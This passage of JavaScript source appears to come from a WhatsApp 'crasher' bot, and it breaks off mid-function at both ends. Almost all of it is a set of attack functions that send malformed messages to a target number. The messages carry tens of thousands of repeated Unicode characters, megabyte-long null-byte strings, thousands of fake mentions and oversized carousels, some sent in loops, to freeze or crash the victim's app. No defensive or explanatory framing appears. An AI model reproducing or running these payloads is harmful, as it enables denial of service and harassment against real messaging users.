    await TamaMods.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
            },
          ],
        },
      ],
    });
    console.log(chalk.green(`Delay With Thumbnail Succes Sending`));
      await new Promise(resolve => setTimeout(resolve, 5000));
  }
}
async function CrashDocth(target) {
await TamaMods.relayMessage(target, {
  viewOnceMessage: {
    message: {
      documentMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7119-24/535817474_1086557396685056_2098138643960660498_n.enc?ccb=11-4&oh=01_Q5Aa2wF2GlcTDyrb3HeCzGldT9skaRrh87_OJPONgzGGCNLA-A&oe=691FE5DC&_nc_sid=5e03e0&mms3=true",
        mimetype: "application/zip",
        fileName: "TamaModss" +  "𑜦𑜠".repeat(18000) + "ི꒦ྀ".repeat(18000) + "ꦾ".repeat(18000) + "ꦽ".repeat(2500) + "ោ៝".repeat(2500),
        fileLength: "999999999",
        mediaKey: "2T8c0kFMy6ezHsvnHeyL9F18nOIqDwMzp4xxu75wGpE=",
        fileSha256: "22HOOUL4B8zY07IRXXf2PKMCzH4HLkcl3ot+Sno8EXs=",
        fileEncSha256: "Z45NoxHeIW45gF9T+b+NE2d6cWXeY+E2tgbjUA84utk=",
        directPath: "/v/t62.7119-24/535817474_1086557396685056_2098138643960660498_n.enc?ccb=11-4&oh=01_Q5Aa2wF2GlcTDyrb3HeCzGldT9skaRrh87_OJPONgzGGCNLA-A&oe=691FE5DC&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1761114688"
       }
     }
   }
 }, { userJid: target });
}
async function CrashExtended(TamaMods, target) {
const message = {
viewOnceMessage: {
message: {
extendedTextMessage: {
text: " #TamaMods. ",
contextInfo: {
remoteJid: "-t.me/TamaModss",
stanzaId: "666",
participant: target,
quotedMessage: {
paymentInviteMessage: {
serviceType: 3,
expiryTimestamp: Date.now() + 1814400000
}
}
}
}
}
}
};

await TamaMods.relayMessage(target, message, {
participant: { jid: target }
});
}
async function CrashImage(TamaMods, target) {
const media = await prepareWAMessageMedia(
{ image: { url: "https://j.top4top.io/p_3580qbqh91.jpg" } },
{ upload: TamaMods.waUploadToServer }
);

const msg = generateWAMessageFromContent(
target,
{
viewOnceMessage: {
message: {
imageMessage: {
...media.imageMessage,
contextInfo: {
remoteJid: "-t.me/TamaModss",
stanzaId: "888",
participant: target,
quotedMessage: {
paymentInviteMessage: {
serviceType: 3,
expiryTimestamp: Date.now() + 1814400000,
},
},
},
},
},
},
},
{}
);

await TamaMods.relayMessage(target, msg.message, { messageId: msg.key.id });
}
async function CrashVideo(TamaMods, target) {
const media = await prepareWAMessageMedia(
{ video: { url: "https://l.top4top.io/m_35803zgt91.mp4" } },
{ upload: TamaMods.waUploadToServer }
);

const msg = generateWAMessageFromContent(
target,
{
viewOnceMessage: {
message: {
videoMessage: {
...media.videoMessage,
caption: "#TamaModss.",
contextInfo: {
remoteJid: "-t.me/TamaModss",
stanzaId: "999",
participant: target,
quotedMessage: {
paymentInviteMessage: {
serviceType: 3,
expiryTimestamp: Date.now() + 1814400000,
},
},
},
},
},
},
},
{}
);

await TamaMods.relayMessage(target, msg.message, { messageId: msg.key.id });
}
async function SpamUiHard(target, ptcp = false) {
  try {
    const msg = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "Tama Crasher" + "ꦽ".repeat(50000),
              hasMediaAttachment: false
            },
            body: {
              text: "Tama Crasher" + "ꦽ".repeat(50000),
            },
            nativeFlowMessage: {
              messageParamsJson: "{}".repeat(1000),
              buttons: [
                {
                  name: "cta_url",
                   buttonParamsJson:
                   "{\"display_text\":\"#4izxvelzExerc1st.\",\"url\":\"https://Wa.me/stickerpack/TamaCrasher\",\"merchant_url\":\"https://Wa.me/stickerpack/TamaCrasher\"}",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "ꦽ".repeat(50000),
                },
                {
                  name: "payment_info",
                  buttonParamsJson: "{\"currency\":\"XAUSD\",\"amount\":{\"value\":null,\"offset\":100},\"payment_type\":\"upi\",\"payment_configuration\":\"merchant_config_123\",\"transaction_id\":\"TX1234567890\",\"status\":\"null\",\"note\":\"-client\"}"
                },
                {
                  name: "galaxy_message",
                   buttonParamsJson: JSON.stringify({
                 icon: "RIVIEW",
                 flow_cta: "ꦽ".repeat(10000),
                 flow_message_version: "3"
                })
                },
                {
                  name: "cta_url",
                  buttonParamsJson:
                  `{\"display_text\":\"${"ꦽ".repeat(1000)}\",\"url\":\"https://Wa.me/stickerpack/TamaBugBot\",\"merchant_url\":\"https://Wa.me/stickerpack/4izxvelzexect\"}`,
                }
              ]
            }
          }
        }
      }
    }, {});

    await TamaMods.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: null
  });

    console.log(chalk.green("Success Sending Bug"));
  } catch (err) {
    console.error(chalk.red("Error Bee:"), err);
  }
}
async function SystemUi(target) {
 await TamaMods.relayMessage(target, {
   groupMentionedMessage: {
      message: {
         interactiveMessage: {
           header: {
            locationMessage: {
              degreesLatitude: 0,
               degreesLongitude: 0
                },
               hasMediaAttachment: true
               },
             body: {
             text: "You Idiot's?" + "ꦾ".repeat(300000)  + "ꦽ".repeat(300000)
              },
            nativeFlowMessage: {},
               contextInfo: {
                 mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 1850 },
                  () => "1" + Math.floor(Math.random() * 900000) + "@s.whatsapp.net"
                ),
              ],
            }
          }
       }
    }
  }, 
  { 
    participant: { jid: target }}, 
  { messageId: null 
  });
}

async function DelayMakluw(target, mention) {  
 let msg = await generateWAMessageFromContent(target,  {  
  viewOnceMessage: { 
    message: {  
       interactiveResponseMessage: {  
         body: {  
          text: "Tama Is Here?",  
          format: "MakLuw"  
         },  
       nativeFlowResponseMessage: {  
            name: "call_permission_request",  
             paramsJson: "\u0000".repeat(1000000),  
           version: 3  
           },
           contextInfo: {
            mentionedJid: [
               "13135550002@s.whatsapp.net",
               target,
               ...Array.from({ length: 2000 }, () =>
                  `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
               )
            ],
            externalAdReply: {
              quotedAd: {
                advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                mediaType: "IMAGE",
                jpegThumbnail: "",
                caption: "𑇂𑆵𑆴𑆿".repeat(60000)
              },
              placeholderKey: {
                remoteJid: "0s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890"
              }
            }
          },
        }  
      }  
    }  
  },  
    {  
     userJid: target,  
     quoted: null  
   }  
 );  

  await TamaMods.relayMessage("status@broadcast", msg.message, {
         messageId: msg.key.id,
          statusJidList: [target],
            additionalNodes: [
             {
               tag: "meta",
                attrs: {},
                 content: [
                  {
                   tag: "mentioned_users",
                    attrs: {},
                      content: [
                      {
                      tag: "to",
                       attrs: { jid: target }, 
                        content: undefined
                       }
                     ]
                  }
                ]
             }
          ]
      });
      await new Promise(resolve => setTimeout(resolve, 5000));
 
     if (mention) {
        await TamaMods.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {});
    }

    console.log(chalk.green(`Delay New for ${target}`));
}
async function NativeSql1(target) {
  const Sql = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: { 
            text: "𝑻𝒂𝒎𝒂 - 𝑶𝒇𝒇𝒊𝒄𝒊𝒂𝒍"
          },
          nativeFlowMessage: { 
            buttons: [
              {
                name: "review_and_pay",
                buttonParamsJson: JSON.stringify({
                  
                })
              }
            ],
             messageParamsJson: "{}"
          }
        }
      }
    }
  }

  await TamaMods.relayMessage(target, Sql.message, {
        additionalNodes: [
          { tag: "biz", attrs: { native_flow_name: "payment_method" } },
        ],
        messageId: Sql.key.id,
        participant: { jid: target },
        userJid: target,
    });
}
async function NativeSql2(target) {
  const msg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: { 
            text: "𝑻𝒂𝒎𝒂 - 𝑶𝒇𝒇𝒊𝒄𝒊𝒂𝒍" + "ꦾ".repeat(50000)
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "payment_method",
                buttonParamsJson: "{}"
              }
            ],
             messageParamsJson: "{}"
          }
        }
      }
    }
  }

  await TamaMods.relayMessage(target, msg.message, {
        additionalNodes: [
          { tag: "biz", attrs: { native_flow_name: "payment_method" } },
        ],
        messageId: msg.key.id,
        participant: { jid: target },
        userJid: target,
    });
}
async function NativeSql3(target) {
  let msg = {
    interactiveMessage: {
      body: {
        text: "𝑻𝒂𝒎𝒂 - 𝑶𝒇𝒇𝒊𝒄𝒊𝒂𝒍" + "ꦾ".repeat(73000)
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "single_select",
            buttonParamsJson: "ꦽ".repeat(55000),
          },
          {
            name: "cta_url",
            buttonParamsJson: "ꦽ".repeat(55000),
          }
        ]
      }
    }
  };

  await TamaMods.relayMessage(target, msg, {
    messageId: null,
    participant: { jid: target },
    userJid: target
  });
}
async function NativeSql4(target) {
  let msg = {
    interactiveMessage: {
      body: {
        text: "𝑻𝒂𝒎𝒂 - 𝑶𝒇𝒇𝒊𝒄𝒊𝒂𝒍" + "꧀".repeat(55000)
      },
      nativeFlowMessage: {
        buttons: [
        {
            name: "galaxy_message",
            buttonParamsJson: JSON.stringify({
              icon: "RIVIEW",
              flow_cta: "ꦽ".repeat(1000),
              flow_message_version: "3"
            })
          },
          {
            name: "single_select",
            buttonParamsJson: "ꦽ".repeat(55000),
          },
          {
            name: "cta_url",
            buttonParamsJson: "ꦽ".repeat(55000),
          }
        ]
      }
    }
  };

  await TamaMods.relayMessage(target, msg, {
    messageId: null,
    participant: { jid: target },
    userJid: target
  });
}
async function NativeSql5(target) {
  let msg = {
    interactiveMessage: {
      body: {
        text: "𝑻𝒂𝒎𝒂 - 𝑶𝒇𝒇𝒊𝒄𝒊𝒂𝒍" + "꧀".repeat(55000)
      },
      nativeFlowMessage: {
        buttons: [
        {
            name: "galaxy_message",
            buttonParamsJson: JSON.stringify({
              icon: "RIVIEW",
              flow_cta: "ꦽ".repeat(1000),
              flow_message_version: "3"
            })
          },
          {
            name: "single_select",
            buttonParamsJson: "ꦽ".repeat(55000),
          },
          {
            name: "cta_url",
            buttonParamsJson: "ꦽ".repeat(55000),
          },
          {
            name: "payment_info",
               buttonParamsJson: "{\"currency\":\"XAUSD\",\"amount\":{\"value\":null,\"offset\":100},\"payment_type\":\"upi\",\"payment_configuration\":\"merchant_config_123\",\"transaction_id\":\"TX1234567890\",\"status\":\"null\",\"note\":\"-client\"}"
          }
        ]
      }
    }
  };

  await TamaMods.relayMessage(target, msg, {
    messageId: null,
    participant: { jid: target },
    userJid: target
  });
}
async function NullCards(TamaMods, target, mention) {
                const media = await prepareWAMessageMedia(
                        { image: { url: "https://l.top4top.io/p_3552yqrjh1.jpg" } },
                        { upload: TamaMods.waUploadToServer }
                )

                let push = []
                for (let r = 0; r < 1000; r++) {
                        push.push(
                                {
                                        body: proto.Message.InteractiveMessage.Body.fromObject({
                                                text: " "
                                        }),
                                        header: proto.Message.InteractiveMessage.Header.fromObject({
                                                hasMediaAttachment: true,
                                                imageMessage: media.imageMessage
                                        }),
                                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                                buttons: [
                                                        {
                                                                name: "carousel_message",
                                                                buttonParamsJson: "SvnX"
                                                        }
                                                ]
                                        })
                                }
                        )
                }

                let msg = await generateWAMessageFromContent(target, {
                                viewOnceMessage: {
                                        message: {
                                                messageContextInfo: {
                                                        deviceListMetadata: {},
                                                        deviceListMetadataVersion: 2
                                                },
                                                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                                                        body: proto.Message.InteractiveMessage.Body.create({
                                                                text: ""
                                                        }),
                                                        footer: proto.Message.InteractiveMessage.Footer.create({
                                                                text: ""
                                                        }),
                                                        header: proto.Message.InteractiveMessage.Header.create({
                                                                hasMediaAttachment: false
                                                        }),
                                                        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                                                                cards: [...push]
                                                        })
                                                })
                                        }
                                }
                        },
                        {}
                )

                await TamaMods.relayMessage("status@broadcast", msg.message, {
                                messageId: msg.key.id,
                                statusJidList: [target],
                                additionalNodes: [
                                        {
                                                tag: "meta",
                                                attrs: {},
                                                content: [
                                                        {
                                                                tag: "mentioned_users",
                                                                attrs: {},
                                                                content: [
                                                                        {
                                                                                tag: "to",
                                                                                attrs: { jid: target },
                                                                                content: undefined
                                                                        }
                                                                ]
                                                        }
                                                ]
                                        }
                                ]
                        }
                )

                if (mention) {
                        await TamaMods.relayMessage(target, {
                                        groupStatusMentionMessage: {
                                                message: {
                                                        protocolMessage: {
                                                                key: msg.key,
                                                                type: 25
                                                        }
                                                }
                                        }
                                },
                                {
                                        additionalNodes: [
                                                {
                                                        tag: "meta",
                                                        attrs: { is_status_mention: "🩸⃟༑⌁⃰𝐙𝐞𝐩𝐡𝐫𝐢𝐧𝐞𝐗-𝐈𝐧𝐟𝐢𝐧𝐢𝐭𝐲🦠" },
                                                        content: undefined
                                                }
                                        ]
                                }
                        )
                }
        console.log(chalk.green(
            `Succes Send Bug By Zephrine.
Number: ${target}`
        ));
        await new Promise(resolve => setTimeout(resolve, 9000));
}
async function DelayGroup(TamaMods, target) {
    const mentionedList = Array.from({ length: 1950 }, () => `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`);
  await TamaMods.sendMessage(target, {
    text: "Tama Modss",
    mentions: target,
    contextInfo: {
      mentionedJid: mentionedList,
      isGroupMention: true
    }
  });
}
async function invisibledelay(target, mention) {
  try {
  const message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
          fileLength: 1,
          mediaKeyTimestamp: 1746112211,
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            remoteJid: target,
            participant: "0@s.whatsapp.net",
            stanzaId: "1234567890ABCDEF",
            mentionedJid: mention || [],
          },
          stickerSentTs: Date.now(),
          isAvatar: false,
          isAiSticker: false,
          isLottie: true,
        }
      }
    }
  }
    const msg = generateWAMessageFromContent(target, message, {})
    await TamaMods.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    })
    const message2 = {
    message: {
      ephemeralMessage: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true", 
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileLength: 543210,
            seconds: 42,
            ptt: true,
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
            mediaKeyTimestamp: Date.now(),
            contextInfo: {
              mentionedJid: [
                "@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                )
              ],
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363375427625764@newsletter",
                serverMessageId: 1,
                newsletterName: "Audio Sample Broadcast"
              }
            },
            waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
          }
        }
      }
    }
  };
    const msg1 = generateWAMessageFromContent(target, message2.message, { userJid: target })
    await TamaMods.relayMessage(target, msg1.message, { messageId: msg1.key.id })

    await sleep(250)
  } catch (err) {
  }
}
async function ProtocolTrash(TamaMods, target, mention) {
         const msg = generateWAMessageFromContent(target, {
                  viewOnceMessage: {
                           message: {
                                    videoMessage: {
                                             url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0&mms3=true",
                                             mimetype: "video/mp4",
                                             fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
                                             fileLength: "4119307",
                                             seconds: 13,
                                             mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
                                             height: 1280,
                                             width: 960,
                                             fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
                                             directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0",
                                             mediaKeyTimestamp: "1744620684",
                                             jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDABsSFBcUERsXFhceHBsgKEIrKCUlKFE6PTBCYFVlZF9VXVtqeJmBanGQc1tdhbWGkJ6jq62rZ4C8ybqmx5moq6T/2wBDARweHigjKE4rK06kbl1upKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKT/wgARCABIAEgDASIAAhEBAxEB/8QAGgAAAgMBAQAAAAAAAAAAAAAAAAUCAwQBBv/EABcBAQEBAQAAAAAAAAAAAAAAAAIBAwD/2gAMAwEAAhADEAAAAN6N2jz1pyXxRZyu6NkzGrqzcHA0RukdlWTXqRmWLjrUwTOVm3OAXETtFZa9RN4tCZzV18lsll0y9OVmbmkcpbJslDflsuz7JafOepX0VEDrcjDpT6QLC4DrxaFFgHL/xAAaEQADAQEBAQAAAAAAAAAAAAAAARAxAhEh/9oACAECAQE/AELJqiE/ELR5EdaJmxHWxfIjqLZ//8QAGxEAAgMBAQEAAAAAAAAAAAAAAAECEBEhMUH/2gAIAQMBAT8AZ9MGsdMzTcQuumR8GjymQfCQ+0yIxiP/xAArEAABBAECBQQCAgMAAAAAAAABAAIDEQQFEiEiIzFRMjNBYRBxExQkQoH/2gAIAQEAAT8Af6Ssn3SpXbWEpjHOcOHAlN6MQBJH6RiMkJdRIWVEYnhwYWg+VpJt5P1+H+g/pZHulZR6axHi9rvjso5GuYLFoT7H7QWgFavKHMY0UeK0U8zx4QUh5D+lOeqVMLYq2vFeVE7YwX2pFsN73voLKnEs1t9I7LRPU8/iU9MqX3Sn8SGjiVj6PNJUjxtHhTROiG1wpZwqNfC0Rwp4+UCpj0yp3U8laVT5nSEXt7KGUnushjZG0Ra1DEP8ZrsFR7LTZjFMPB7o8zeB7qc9IrI4ly0bvIozRRNttSMEsZ+1qGG6CQuA5So3U4LFdugYT4U/tFS+py0w0ZKUb7ophtqigdt+lPiNkjLJACCs/Tn4jt92wngVhH/GZfhZHtFSnmctNcf7JYP9kIzHVnuojwUMlNpSPBK1Pa/DeD/xQ8uG0fJCyT0isg1axH7MpjvtSDcy1A6xSc4jsi/gtQyDyx/LioySA34C//4AAwD/2Q==",
                                             contextInfo: {
                                                      isSampled: true,
                                                      mentionedJid: [
                                                               "6281991410940@s.whatsapp.net",
                                                               ...Array.from({ length: 1900 }, () =>
                                                                        `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                                                               )
                                                      ]
                                             },
                                             streamingSidecar: "APsZUnB5vlI7z28CA3sdzeI60bjyOgmmHpDojl82VkKPDp4MJmhpnFo0BR3IuFKF8ycznDUGG9bOZYJc2m2S/H7DFFT/nXYatMenUXGzLVI0HuLLZY8F1VM5nqYa6Bt6iYpfEJ461sbJ9mHLAtvG98Mg/PYnGiklM61+JUEvbHZ0XIM8Hxc4HEQjZlmTv72PoXkPGsC+w4mM8HwbZ6FD9EkKGfkihNPSoy/XwceSHzitxjT0BokkpFIADP9ojjFAA4LDeDwQprTYiLr8lgxudeTyrkUiuT05qbt0vyEdi3Z2m17g99IeNvm4OOYRuf6EQ5yU0Pve+YmWQ1OrxcrE5hqsHr6CuCsQZ23hFpklW1pZ6GaAEgYYy7l64Mk6NPkjEuezJB73vOU7UATCGxRh57idgEAwVmH2kMQJ6LcLClRbM01m8IdLD6MA3J3R8kjSrx3cDKHmyE7N3ZepxRrbfX0PrkY46CyzSOrVcZvzb/chy9kOxA6U13dTDyEp1nZ4UMTw2MV0QbMF6n94nFHNsV8kKLaDberigsDo7U1HUCclxfHBzmz3chng0bX32zTyQesZ2SORSDYHwzU1YmMbSMahiy3ciH0yQq1fELBvD5b+XkIJGkCzhxPy8+cFZV/4ATJ+wcJS3Z2v7NU2bJ3q/6yQ7EtruuuZPLTRxWB0wNcxGOJ/7+QkXM3AX+41Q4fddSFy2BWGgHq6LDhmQRX+OGWhTGLzu+mT3WL8EouxB5tmUhtD4pJw0tiJWXzuF9mVzF738yiVHCq8q5JY8EUFGmUcMHtKJHC4DQ6jrjVCe+4NbZ53vd39M792yNPGLS6qd8fmDoRH",
                                             thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                                             thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                                             thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                                             annotations: [{
                                                      embeddedContent: {
                                                               embeddedMusic: {
                                                                        musicContentMediaId: "SVNX",
                                                                        songId: "INVASION",
                                                                        author: "TamaMods",
                                                                        title: "TamaMods",
                                                                        artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                                                        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                                                        artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                                                        artistAttribution: "https://www.instagram.com/raditx7",
                                                                        countryBlocklist: true,
                                                                        isExplicit: true,
                                                                        artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                                               }
                                                      },
                                                      embeddedAction: null
                                             }]
                                    }
                           }
                  }
         }, {});

         await TamaMods.relayMessage("status@broadcast", msg.message, {
                  messageId: msg.key.id,
                  statusJidList: [target],
                  additionalNodes: [{
                           tag: "meta",
                           attrs: {},
                           content: [{
                                    tag: "mentioned_users",
                                    attrs: {},
                                    content: [{
                                             tag: "to",
                                             attrs: { jid: target },
                                             content: undefined
                                    }]
                           }]
                  }]
         });

         if (mention) {
                  await TamaMods.relayMessage(target, {
                           groupStatusMentionMessage: {
                                    message: {
                                             protocolMessage: {
                                                      key: msg.key,
                                                      type: 25
                                             }
                                    }
                           }
                  }, {
                           additionalNodes: [{
                                    tag: "meta",
                                    attrs: {
                                             is_status_mention: "true"
                                    },
                                    content: undefined
                           }]
                  });
         }
    console.log(chalk.green(`Succes Send Bug By TamaModss.🐉
Number: ${target}`));
    await new Promise(resolve => setTimeout(resolve, 5000));
}
async function InterPay(target) {
  const media = await prepareWAMessageMedia(
    { image: { url: "https://files.catbox.moe/9wfv0a.jpg" } },
    { upload: TamaMods.waUploadToServer }
  );

  const msg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            remoteJid: "X",
            stanzaId: "123",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000,
              },
              forwardedAiBotMessageInfo: {
                botName: "META AI",
                botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                creatorName: "Bot",
              },
            },
          },
          carouselMessage: {
            messageVersion: 1,
            cards: [
              {
                header: {
                  hasMediaAttachment: true,
                  media: media.imageMessage,
                },
                body: {
                  text: "𝑻𝒂𝒎𝒂 - 𝑶𝒇𝒇𝒊𝒄𝒊𝒂𝒍" + "ꦾ".repeat(50000),
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: "ꦽ".repeat(2000),
                    },
                    {
                      name: "galaxy_message",
                      buttonParamsJson: JSON.stringify({
                       icon: "RIVIEW",
                       flow_cta: "ꦽ".repeat(1000),
                       flow_message_version: "3"
                   })
                    },
                    {
                      name: "payment_info",
                      buttonParamsJson: "{\"currency\":\"IRP\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4P46GMY57GC\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"XXX\",\"key\":\"+99999999999\",\"key_type\":\"XXX\"}}]}"
                    },
                    {
                      name: "payment_info",
                      buttonParamsJson: "{\"currency\":\"XAUSD\",\"amount\":{\"value\":null,\"offset\":100},\"payment_type\":\"upi\",\"payment_configuration\":\"merchant_config_123\",\"transaction_id\":\"TX1234567890\",\"status\":\"null\",\"note\":\"-client\"}"
                    },
                  ],
                  messageParamsJson: "{}".repeat(10000),
                },
              },
            ],
          },
        },
      },
    },
  };

  await TamaMods.relayMessage(target, msg, {
    messageId: null,
    userJid: target,
  });
}
async function CtaZtsL(TamaMods, target) {
  const media = await prepareWAMessageMedia(
    { image: { url: "https://l.top4top.io/p_3552yqrjh1.jpg" } },
    { upload: TamaMods.waUploadToServer }
  );

  const Interactive = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {},
          body: {
            text: "𝑻𝒂𝒎𝒂 - 𝑶𝒇𝒇𝒊𝒄𝒊𝒂𝒍" + "ꦽ".repeat(100000),
          },
          footer: {
            text: "𝑿-𝑮𝒆𝒕𝒔𝒖𝒛𝒐",
          },
          header: {
            hasMediaAttachment: true,
            imageMessage: media.imageMessage,
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "𝑻𝒂𝒎𝒂 - 𝑶𝒇𝒇𝒊𝒄𝒊𝒂𝒍",
                  url: "http://wa.Me/stickerpack/Xinzu",
                }),
              },
            ],
            messageParamsJson: "{}",
          },
        },
      },
    },
  };

  await TamaMods.relayMessage(target, Interactive, {
    messageId: null,
    userJid: target,
  });
}
async function newsletterpay(target) {   
    const mentionedList = [
    target, ...Array.from({ length: 1900 }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
      )
    ];
    
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: '1@newsletter',
                        newsletterName:"ꦾ".repeat(60000),
                        jpegThumbnail: "",
                        caption: "ꦾ".repeat(60000),
                        inviteExpiration: Date.now() * 9999999999e+21,
                    },
                },
            },
            nativeFlowMessage: {
              messageParamsJson: "{}",
              buttons: [
                {
                  name: "payment_method",
                  buttonParamsJson: "\u0000".repeat(100000),
                },
              ]
            },
            contextInfo: {
              remoteJid: target,
              participant: target,
              mentionedJid: mentionedList,
              stanzaId: TamaMods.generateMessageTag(),
            },
        };

        await TamaMods.relayMessage(target, message, {
          userJid: target,
        });
    } catch (error) {
        console.log("error:\n" + error);
    }
}
async function InVisibleZets(TamaMods, target, mention) {
  try {
    let lopix = 500;
    
    const msg = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "\nhttps://t.me/TamaModss\n",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1048000),
              version: 3
            }
          }
        }
      }
    }, {})

      for (let i = 0; i < lopix; i++) {
      await TamaMods.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
